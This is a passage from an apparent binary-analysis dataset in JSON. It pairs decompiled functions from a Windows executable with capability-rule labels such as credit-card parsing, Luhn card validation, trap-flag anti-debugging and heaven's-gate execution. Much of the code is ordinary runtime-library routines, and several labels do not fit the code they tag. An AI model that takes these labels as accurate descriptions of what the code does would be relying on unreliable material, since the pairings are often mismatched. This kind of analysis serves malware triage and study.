        "decompiled_code": "\nuint64_t __fastcall fcn.00401b8b(uint8_t param_1, uint32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    if (0x3f < param_1) {\n        return 0;\n    }\n    if (param_1 < 0x20) {\n        return CONCAT44(param_2 >> (param_1 & 0x1f), in_EAX >> (param_1 & 0x1f) | param_2 << 0x20 - (param_1 & 0x1f));\n    }\n    return param_2 >> (param_1 & 0x1f);\n}\n",
        "token_count": 146
    },
    "00401c03": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401c03(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x571ca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x571ca8;\n}\n",
        "token_count": 96
    },
    "00402fe5": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00402fe5(uint arg_8h)\n\n{\n    uint uVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    \n    uVar2 = *0x571ca8 & 0x1f;\n    pcVar3 = (*0x571ca8 ^ *0x57502c) >> uVar2 | (*0x571ca8 ^ *0x57502c) << 0x20 - uVar2;\n    if (pcVar3 == NULL) {\n        uVar1 = 0;\n    }\n    else {\n        (**0x578000)(arg_8h);\n        uVar1 = (*pcVar3)();\n    }\n    return uVar1;\n}\n",
        "token_count": 160
    },
    "00403067": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403067(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x571ca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x571ca8;\n}\n",
        "token_count": 95
    },
    "00403a8a": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00403a8a(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x571ca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x571ca8;\n}\n",
        "token_count": 97
    },
    "00404147": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nint64_t __fastcall fcn.00404147(uint8_t param_1, int32_t param_2)\n\n{\n    uint32_t in_EAX;\n    \n    if (0x3f < param_1) {\n        return 0;\n    }\n    if (param_1 < 0x20) {\n        return CONCAT44(param_2 << (param_1 & 0x1f) | in_EAX >> 0x20 - (param_1 & 0x1f), in_EAX << (param_1 & 0x1f));\n    }\n    return (in_EAX << (param_1 & 0x1f)) << 0x20;\n}\n",
        "token_count": 151
    },
    "00404417": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404417(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x571ca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x571ca8;\n}\n",
        "token_count": 95
    },
    "00404570": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t fcn.00404570(void)\n\n{\n    uint8_t uVar1;\n    int32_t unaff_EBP;\n    uint32_t uVar2;\n    uint *in_FS_OFFSET;\n    uint var_1ch;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004022de(0x56f2f8, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    fcn.00406505(0);\n    *(unaff_EBP + -4) = 0;\n    uVar1 = *0x571ca8 & 0x1f;\n    uVar2 = (*0x571ca8 ^ *0x5744c8) >> uVar1 | (*0x571ca8 ^ *0x5744c8) << 0x20 - uVar1;\n    *(unaff_EBP + -0x1c) = uVar2;\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004aa46a();\n    *in_FS_OFFSET = *(unaff_EBP + -0x10);\n    return uVar2;\n}\n",
        "token_count": 279
    },
    "004045c0": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004045c0(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x571ca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x571ca8;\n}\n",
        "token_count": 96
    },
    "00404903": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t fcn.00404903(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    \n    uVar2 = *0x571ca8 & 0x1f;\n    uVar1 = (*0x571ca8 ^ *0x57502c) >> uVar2 | (*0x571ca8 ^ *0x57502c) << 0x20 - uVar2;\n    return uVar1 & 0xffffff00 | uVar1 != 0;\n}\n",
        "token_count": 115
    },
    "004051e6": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004051e6(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x571ca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x571ca8;\n}\n",
        "token_count": 96
    },
    "004054e8": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004054e8(uint arg_8h)\n\n{\n    uint32_t var_4h;\n    \n    var_4h = 0;\n    fcn.004056a0(&var_4h, arg_8h);\n    return var_4h & 0x1f;\n}\n",
        "token_count": 72
    },
    "004056a0": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004056a0(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if ((arg_ch & 0x1f) == 0) {\n        *arg_8h = 0;\n    }\n    else {\n        uVar1 = fcn.004048d1();\n        uVar2 = fcn.00406096(arg_ch & 0x1f);\n        *arg_8h = uVar2 & uVar1;\n    }\n    return 0;\n}\n",
        "token_count": 132
    },
    "004056dc": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004056dc(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x571ca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x571ca8;\n}\n",
        "token_count": 95
    },
    "00405fdd": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405fdd(uint32_t *arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    if ((arg_ch & 0x1f) != 0) {\n        uVar1 = fcn.00406096(arg_ch & 0x1f);\n        uVar2 = fcn.00406096(0x3f);\n        uVar4 = *arg_8h;\n        uVar3 = fcn.004048d1();\n        uVar1 = uVar3 & ~uVar1 | uVar4 & uVar2 & uVar1;\n        fcn.004029be(uVar1);\n        uVar1 = uVar1 & 0x1f;\n        uVar4 = fcn.004054e8(uVar1);\n        if (uVar4 != uVar1) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 233
    },
    "004060cd": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004060cd(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    code *pcVar3;\n    \n    iVar1 = fcn.00406924();\n    if (((iVar1 == 0) || (pcVar3 = *(iVar1 + 0x35c),  pcVar3 == NULL)) &&\n       (uVar2 = *0x571ca8 & 0x1f,  pcVar3 = (*0x571ca8 ^ *0x5744bc) >> uVar2 | (*0x571ca8 ^ *0x5744bc) << 0x20 - uVar2, \n       pcVar3 == NULL)) {\n        fcn.0040366b(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n        pcVar3 = swi(3);\n        (*pcVar3)();\n        return;\n    }\n    (**0x578000)(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 274
    },
    "00406942": {
        "rules": [
            "decompress data using LZO/b26d4b886bd545b48ed63f32c6357c17"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00406942(uint32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    \n    uVar1 = 0x20 - (*0x571ca8 & 0x1f) & 0x1f;\n    return (arg_8h >> uVar1 | arg_8h << 0x20 - uVar1) ^ *0x571ca8;\n}\n",
        "token_count": 95
    },
    "00403cdd": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403cdd(int32_t arg_8h, uint noname_1, int32_t arg_10h)\n\n{\n    if (*(arg_10h + 4) < 0x81) {\n        return *(arg_8h + 8);\n    }\n    return *(arg_8h + 8);\n}\n",
        "token_count": 79
    },
    "004025db": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nushort __cdecl fcn.004025db(uint arg_8h)\n\n{\n    if ((((arg_8h != 100) && (arg_8h != 0x69)) && (arg_8h != 0x6f)) &&\n       (((arg_8h != 0x75 && (arg_8h != 0x78)) && ((arg_8h != 0x58 && (arg_8h != 0x2a)))))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 116
    },
    "004038e1": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nushort __cdecl fcn.004038e1(uint arg_8h)\n\n{\n    if ((((arg_8h != 100) && (arg_8h != 0x69)) && (arg_8h != 0x6f)) &&\n       (((arg_8h != 0x75 && (arg_8h != 0x78)) && ((arg_8h != 0x58 && (arg_8h != 0x2a)))))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 117
    },
    "00404647": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.00404647(uint arg_8h)\n\n{\n    if ((((arg_8h != 'd') && (arg_8h != 'i')) && (arg_8h != 'o')) &&\n       (((arg_8h != 'u' && (arg_8h != 'x')) && ((arg_8h != 'X' && (arg_8h != '*')))))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 103
    },
    "004058f8": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuchar __cdecl fcn.004058f8(uint arg_8h)\n\n{\n    if ((((arg_8h != 'd') && (arg_8h != 'i')) && (arg_8h != 'o')) &&\n       (((arg_8h != 'u' && (arg_8h != 'x')) && ((arg_8h != 'X' && (arg_8h != '*')))))) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 104
    },
    "0040273e": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040273e(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0;\n    fcn.00403189(arg_8h, 0, 0x2c);\n    uVar1 = fcn.00403071();\n    *arg_8h = uVar1;\n    uVar1 = fcn.00403931();\n    arg_8h[1] = uVar1;\n    iVar2 = fcn.00403819();\n    iVar2 = *(iVar2 + 8);\n    arg_8h[2] = iVar2 == 0;\n    if (iVar2 != 0) {\n        iVar2 = fcn.00404da4();\n        do {\n            if (*(iVar2 + uVar3 * 2) < 0) {\n                *((uVar3 >> 3) + 0xc + arg_8h) = *((uVar3 >> 3) + 0xc + arg_8h) | 1 << (uVar3 & 7);\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < 0x100);\n    }\n    return arg_8h;\n}\n",
        "token_count": 286
    },
    "00402f40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00402f40(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t in_ECX;\n    uint32_t in_stack_ffffffcc;\n    uint var_24h;\n    uint var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    \n    var_18h = *(in_ECX + 0x10);\n    if (*(in_ECX + 0x14) - var_18h < arg_8h) {\n        var_10h = fcn.00403efe(arg_8h, in_stack_ffffffcc & 0xffffff00 | var_20h, arg_8h, arg_ch & 0xffff);\n    }\n    else {\n        *(in_ECX + 0x10) = var_18h + arg_8h;\n        var_1ch = fcn.004051b9();\n        fcn.00406271(var_1ch + var_18h * 2, arg_8h, arg_ch & 0xffff);\n        var_20h._2_2_ = 0;\n        fcn.00401456(var_1ch + (var_18h + arg_8h) * 2, &var_20h + 2);\n        var_10h = in_ECX;\n    }\n    return var_10h;\n}\n",
        "token_count": 333
    },
    "004030c6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004030c6(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    fcn.00405830(arg_8h, arg_ch, arg_10h << 1);\n    return arg_8h;\n}\n",
        "token_count": 61
    },
    "004033f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004033f5(int32_t arg_8h, uint arg_ch, int32_t arg_10h, int32_t arg_14h, uint32_t arg_18h)\n\n{\n    ushort var_ah;\n    uint var_8h;\n    \n    fcn.004030c6(arg_8h, arg_ch, arg_10h);\n    fcn.00406271(arg_8h + arg_10h * 2, arg_14h, arg_18h & 0xffff);\n    var_ah = 0;\n    fcn.00401456(arg_8h + (arg_10h + arg_14h) * 2, &var_ah);\n    return;\n}\n",
        "token_count": 161
    },
    "00403981": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403981(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint var_ch;\n    ushort var_6h;\n    uint var_4h;\n    \n    var_6h = 0;\n    iVar1 = fcn.004051b9();\n    *(in_ECX + 0x10) = arg_8h;\n    fcn.00401456(iVar1 + arg_8h * 2, &var_6h);\n    return;\n}\n",
        "token_count": 121
    },
    "004054c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.004054c0(uint32_t arg_8h)\n\n{\n    uint var_8h;\n    uint var_1h;\n    \n    if (0x7fffffff < arg_8h) {\n        fcn.00405169(0x7fffffff);\n    }\n    return arg_8h << 1;\n}\n",
        "token_count": 109
    },
    "00406082": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406082(uint arg_8h, int32_t arg_ch)\n\n{\n    uint var_4h;\n    \n    fcn.00401654(arg_8h, arg_ch << 1);\n    return;\n}\n",
        "token_count": 53
    },
    "00403693": {
        "rules": [
            "check for trap flag exception/d5d4160e77a5474aa5157e4631e4f1b3"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.00403693(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    uint uVar3;\n    char *var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    cVar1 = **0x574458;\n    pcVar2 = *0x574458;\n    if (cVar1 == '\\0') {\ncode_r0x00490ca7:\n        *0x574458 = pcVar2;\n        fcn.0040129e(arg_8h, 1, arg_ch);\n        return arg_8h;\n    }\n    if (cVar1 == '$') {\n        if ((*0x574458)[1] == '$') {\n            pcVar2 = *0x574458 + 2;\n            cVar1 = *pcVar2;\n            if (cVar1 < 'S') {\n                if (cVar1 == 'R') {\n                    if (*arg_ch == 0) {\n                        var_10h = \"volatile\";\n                        var_ch = 8;\n                    }\n                    else {\n                        var_10h = \"volatile \";\n                        var_ch = 9;\n                    }\n                    *0x574458 = pcVar2;\n                    fcn.004022f7(&var_10h);\n                }\n                else {\n                    if (cVar1 == '\\0') goto code_r0x00490ca7;\n                    if (cVar1 == 'A') {\n                        *0x574458 = *0x574458 + 3;\n                        fcn.00406965(arg_8h, arg_ch);\n                        return arg_8h;\n                    }\n                    if (cVar1 == 'B') {\n                        *0x574458 = *0x574458 + 3;\n                        fcn.00405132(arg_8h, arg_ch, 1);\n                        return arg_8h;\n                    }\n                    if (cVar1 == 'C') {\n                        *0x574458 = *0x574458 + 3;\n                        var_10h = NULL;\n                        var_ch = 0;\n                        uVar3 = fcn.004013cf(&var_8h, arg_ch, 0, &var_10h, 0);\n                        fcn.00405c13(arg_8h, uVar3);\n                        return arg_8h;\n                    }\n                    *0x574458 = pcVar2;\n                    if (cVar1 != 'Q') goto code_r0x00490e32;\n                }\n                uVar3 = 3;\n                goto code_r0x00490c6c;\n            }\n            if (cVar1 == 'S') {\n                pcVar2 = *0x574458 + 3;\n            }\n            else {\n                if (cVar1 == 'T') {\n                    *0x574458 = *0x574458 + 3;\n                    if (*arg_ch != 0) {\n                        var_10h = \"std::nullptr_t \";\n                        var_ch = 0xf;\n                        fcn.004040cf(arg_8h, &var_10h, arg_ch);\n                        return arg_8h;\n                    }\n                    var_10h = \"std::nullptr_t\";\n                    var_ch = 0xe;\n                    fcn.00402d47(&var_10h);\n                    return arg_8h;\n                }\n                if (cVar1 == 'V') {\n                    *0x574458 = *0x574458 + 3;\n                    *arg_8h = *arg_ch;\n                    arg_8h[1] = arg_ch[1];\n                    return arg_8h;\n                }\n                if (cVar1 == 'Y') {\n                    *0x574458 = *0x574458 + 3;\n                    fcn.004064b0(arg_8h);\n                    return arg_8h;\n                }\n            }\n        }\n        else if ((*0x574458)[1] == '\\0') goto code_r0x00490ca7;\ncode_r0x00490e32:\n        *0x574458 = pcVar2;\n        arg_8h[1] = 0;\n        *(arg_8h + 1) = 2;\n        *arg_8h = 0;\n    }\n    else {\n        if (cVar1 != 'A') {\n            if (cVar1 != 'B') {\n                fcn.00405c13(arg_8h, arg_ch);\n                return arg_8h;\n            }\n            if (*arg_ch == 0) {\n                var_10h = \"volatile\";\n                var_ch = 8;\n            }\n            else {\n                var_10h = \"volatile \";\n                var_ch = 9;\n            }\n            fcn.004022f7(&var_10h);\n        }\n        uVar3 = 2;\ncode_r0x00490c6c:\n        var_10h = *arg_ch;\n        *0x574458 = *0x574458 + 1;\n        var_ch = arg_ch[1] | 0x100;\n        fcn.00404cfa(arg_8h, &var_8h, &var_10h, uVar3);\n    }\n    return arg_8h;\n}\n",
        "token_count": 1177
    },
    "0040668b": {
        "rules": [
            "compute adler32 checksum/59ba9d7991e641c88d7c729645f1cfca"
        ],
        "decompiled_code": "\nvoid fcn.0040668b(void)\n\n{\n    if ((*0x571ca8 == 0xbb40e64e) || ((*0x571ca8 & 0xffff0000) == 0)) {\n        *0x571ca8 = fcn.004626b9();\n        if (*0x571ca8 == 0xbb40e64e) {\n            *0x571ca8 = 0xbb40e64f;\n        }\n        else if ((*0x571ca8 & 0xffff0000) == 0) {\n            *0x571ca8 = *0x571ca8 | (*0x571ca8 | 0x4711) << 0x10;\n        }\n    }\n    *0x571ca4 = ~*0x571ca8;\n    return;\n}\n",
        "token_count": 179
    },
    "0040332d": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040332d(uint8_t *arg_8h, uint8_t **arg_ch, uint8_t *arg_10h)\n\n{\n    uint8_t uVar1;\n    uint32_t in_EAX;\n    uint32_t uVar2;\n    uint8_t *puVar3;\n    uint32_t uVar4;\n    uint32_t extraout_ECX;\n    int32_t iVar5;\n    uint uVar6;\n    uint var_4h;\n    \n    iVar5 = 0;\n    uVar4 = *arg_8h;\n    uVar2 = in_EAX & 0xffffff00 | uVar4;\n    uVar6 = 3;\n    while ((uVar4 == *(iVar5 + 0x558660) || (uVar4 == *(iVar5 + 0x558664)))) {\n        uVar1 = **arg_ch;\n        uVar4 = uVar1;\n        puVar3 = *arg_ch + 1;\n        iVar5 = iVar5 + 1;\n        *arg_ch = puVar3;\n        *arg_8h = uVar1;\n        uVar2 = puVar3 & 0xffffff00 | uVar4;\n        if (iVar5 == 3) {\n            fcn.00402e0a(uVar4);\n            arg_10h = *arg_ch;\n            uVar1 = *arg_10h;\n            uVar2 = extraout_ECX & 0xffffff00 | uVar1;\n            *arg_ch = arg_10h + 1;\n            iVar5 = 0;\n            *arg_8h = uVar1;\n            uVar4 = arg_10h + 1 & 0xffffff00 | uVar1;\n            while ((uVar2 == *(iVar5 + 0x558668) || (uVar2 == *(iVar5 + 0x558670)))) {\n                uVar1 = **arg_ch;\n                uVar2 = uVar2 & 0xffffff00 | uVar1;\n                puVar3 = *arg_ch + 1;\n                iVar5 = iVar5 + 1;\n                *arg_ch = puVar3;\n                *arg_8h = uVar1;\n                uVar4 = puVar3 & 0xffffff00 | uVar1;\n                if (iVar5 == 5) {\n                    fcn.00402e0a(uVar2);\n                    return 3;\n                }\n            }\n            fcn.00402e0a(uVar4);\ncode_r0x004b6107:\n            *arg_8h = 0;\n            *arg_ch = arg_10h;\n            return uVar6;\n        }\n    }\n    fcn.00402e0a(uVar2);\n    uVar6 = 7;\n    goto code_r0x004b6107;\n}\n",
        "token_count": 618
    },
    "00404e08": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404e08(char *arg_8h, char **arg_ch)\n\n{\n    char *in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    char cVar3;\n    \n    uVar2 = 0;\n    iVar1 = 0;\n    cVar3 = *arg_8h;\n    do {\n        if ((cVar3 != \"SNAN)\"[iVar1]) && (cVar3 != *(iVar1 + 0x5586c0))) goto code_r0x004b660d;\n        cVar3 = **arg_ch;\n        in_EAX = *arg_ch + 1;\n        iVar1 = iVar1 + 1;\n        *arg_ch = in_EAX;\n        *arg_8h = cVar3;\n    } while (iVar1 != 5);\n    uVar2 = 1;\ncode_r0x004b660d:\n    return in_EAX & 0xffffff00 | uVar2;\n}\n",
        "token_count": 221
    },
    "004061a9": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.004061a9(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint *var_28h;\n    uint *var_24h;\n    uint *var_20h;\n    uint *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_ch = 0;\n    var_10h = 0;\n    if (5 < arg_8h) {\n        puVar1 = fcn.00403a35();\n        *puVar1 = 0x16;\n        fcn.004037ce();\n        return 0;\n    }\n    var_8h = fcn.004043ef();\n    fcn.00404a7f();\n    fcn.00403b75();\n    *(var_8h + 0x350) = *(var_8h + 0x350) | 0x10;\n    var_14h = &var_8h;\n    var_28h = &var_10h;\n    var_24h = &var_8h;\n    var_20h = &var_ch;\n    var_1ch = &arg_8h;\n    var_18h = &arg_ch;\n    fcn.004ad185(&var_1h, &var_28h);\n    return var_ch;\n}\n",
        "token_count": 345
    },
    "00403378": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00403378(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = *(param_2 + 4) & 0x7ff00000;\n    if (uVar1 != 0x7ff00000) {\n        return uVar1;\n    }\n    return *(param_2 + 4);\n}\n",
        "token_count": 91
    },
    "0040698d": {
        "rules": [
            "hash data using aphash/ab9c9a8537c84744923d9bbb8bd71d10"
        ],
        "decompiled_code": "\nulong __cdecl fcn.0040698d(uint32_t arg_8h, int32_t arg_ch, uint arg_10h, uint32_t arg_14h, uint *arg_18h)\n\n{\n    arg_18h[1] = (arg_ch + 0x3ffU & 0x7ff | (arg_8h & 0xff) << 0xb) << 0x14 | arg_14h & 0xfffff;\n    *arg_18h = arg_10h;\n    return 0;\n}\n",
        "token_count": 122
    },
    "0040386e": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040386e(uint lpBuffer, uint nNumberOfCharsToWrite, uint lpNumberOfCharsWritten)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_WriteConsoleW)\n                      (*0x572930, lpBuffer, nNumberOfCharsToWrite, lpNumberOfCharsWritten, 0);\n    if (iVar1 == 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar2 == 6) {\n            fcn.004061bd();\n            fcn.004e1a0d();\n            iVar1 = (*_sym.imp.KERNEL32.dll_WriteConsoleW)\n                              (*0x572930, lpBuffer, nNumberOfCharsToWrite, lpNumberOfCharsWritten, 0);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 190
    },
    "00404d90": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404d90(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    bool bVar4;\n    \n    if (arg_8h != arg_ch) {\n        puVar3 = arg_ch + 5;\n        puVar2 = arg_8h + 5;\n        do {\n            uVar1 = *puVar2;\n            bVar4 = uVar1 < *puVar3;\n            if (uVar1 != *puVar3) {\ncode_r0x00489742:\n                return -bVar4 | 1;\n            }\n            if (uVar1 == 0) {\n                return 0;\n            }\n            uVar1 = puVar2[1];\n            bVar4 = uVar1 < puVar3[1];\n            if (uVar1 != puVar3[1]) goto code_r0x00489742;\n            puVar2 = puVar2 + 2;\n            puVar3 = puVar3 + 2;\n        } while (uVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 266
    },
    "0040639d": {
        "rules": [
            "encrypt data using Curve25519/f8ce07bf90384b3481717cbf54aaf528"
        ],
        "decompiled_code": "\nuint * fcn.0040639d(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint var_8h;\n    \n    puVar2 = fcn.00405088(0x40, 0x38);\n    if (puVar2 == NULL) {\n        puVar2 = NULL;\n    }\n    else if (puVar2 != puVar2 + 0x380) {\n        puVar3 = puVar2 + 8;\n        do {\n            fcn.00404ed0(puVar3 + -8, 4000, 0);\n            puVar3[-2] = 0xffffffff;\n            *(puVar3 + 0xd) = *(puVar3 + 0xd) & 0xf8;\n            *puVar3 = 0;\n            puVar3[1] = 0;\n            puVar1 = puVar3 + 6;\n            puVar3[2] = 0xa0a0000;\n            *(puVar3 + 3) = 10;\n            *(puVar3 + 0xe) = 0;\n            *(puVar3 + 0x12) = 0;\n            puVar3 = puVar3 + 0xe;\n        } while (puVar1 != puVar2 + 0x380);\n    }\n    fcn.0040640b(0);\n    return puVar2;\n}\n",
        "token_count": 316
    },
    "00401028": {
        "rules": [
